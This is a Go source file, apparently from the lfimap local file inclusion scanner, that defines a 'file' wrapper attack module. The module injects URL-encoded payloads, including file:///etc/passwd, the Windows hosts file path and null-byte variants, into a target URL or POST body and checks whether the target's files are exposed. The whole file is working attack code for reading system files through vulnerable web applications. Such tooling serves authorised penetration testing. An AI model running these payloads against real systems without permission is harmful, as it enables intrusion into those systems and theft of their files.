package attacks

import (
	"fmt"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

// FileAttack implements file wrapper attack
type FileAttack struct{}

// Name returns the attack name
func (a *FileAttack) Name() string {
	return "file"
}

// Test executes the file wrapper attack
func (a *FileAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing with file wrapper...\n", ctx.Colors.Blue("[i]"))
	}

	tests := []string{
		"file%3A%2F%2F%2Fetc%2Fpasswd",
		"file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
		"file%3A%2F%2F%2Fetc%2Fpasswd%2500",
		"file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500",
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	for i, test := range tests {
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "LFI", "FILE", false, false, false)

		if !result.DoContinue {
			return true
		}

		if i == 1 && ctx.Quick {
			return false
		}
	}

	return false
}
